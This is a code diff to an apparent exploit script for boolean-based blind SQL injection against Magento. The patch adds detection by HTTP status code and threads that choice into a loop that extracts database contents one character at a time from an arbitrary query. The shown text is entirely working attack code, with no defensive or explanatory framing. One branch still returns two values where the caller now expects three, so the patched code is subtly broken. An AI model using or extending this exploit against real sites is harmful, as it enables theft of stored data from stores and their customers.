@@ -63,30 +63,30 @@ def check_vulnerability(target):
             print("[+] VULNERABLE! Different response lengths detected:")
             print(f"    TRUE condition:  {len_true} bytes")
             print(f"    FALSE condition: {len_false} bytes")
-            return True, len_true
+            return True, len_true, False
         # Fallback: check status codes
         elif status_true != status_false:
             print("[+] VULNERABLE! Different HTTP status codes detected:")
             print(f"    TRUE condition:  HTTP {status_true}")
             print(f"    FALSE condition: HTTP {status_false}")
-            return True, status_true
+            return True, status_true, True
         else:
             print(f"[-] Same response for both conditions (length={len_true}, status={status_true})")
             print("[-] Target may not be vulnerable, not properly set up, or database not connected.")
             print("[*] Tip: Make sure Magento is fully initialized and database is connected.")
-            return False, None
+            return False, None, False
     else:
         print("[-] Could not get response from target.")
         return False, None
 
 
-def extract_data(target, query, true_marker, max_length=64):
+def extract_data(target, query, true_marker, max_length=64, use_status=False):
     """Extract data using boolean-based blind SQL injection."""
     result = ""
     charset = string.ascii_letters + string.digits + string.punctuation + " _-.@:"
 
     print(f"[*] Extracting data with query: {query}")
-    print(f"[*] Using marker: {true_marker}")
+    print(f"[*] Using marker: {true_marker} ({'status code' if use_status else 'response length'})")
 
     for pos in range(1, max_length + 1):
         found = False
@@ -97,8 +97,8 @@ def extract_data(target, query, true_marker, max_length=64):
             )
             length, status = test_sqli(target, condition)
 
-            # Check if this character matches (compare with true_marker)
-            if isinstance(true_marker, int) and length == true_marker:
+            matched = (status == true_marker) if use_status else (length == true_marker)
+            if matched:
                 result += char
                 sys.stdout.write(f"\r[+] Extracted: {result}")
                 sys.stdout.flush()
@@ -131,11 +131,11 @@ def main():
     if not check_target(target):
         sys.exit(1)
 
-    vulnerable, true_status = check_vulnerability(target)
+    vulnerable, true_status, use_status = check_vulnerability(target)
 
     if args.mode == "extract" and vulnerable:
         print()
-        data = extract_data(target, args.query, true_status, args.max_length)
+        data = extract_data(target, args.query, true_status, args.max_length, use_status)
         if data:
             print(f"\n[+] Extracted data: {data}")
         else:
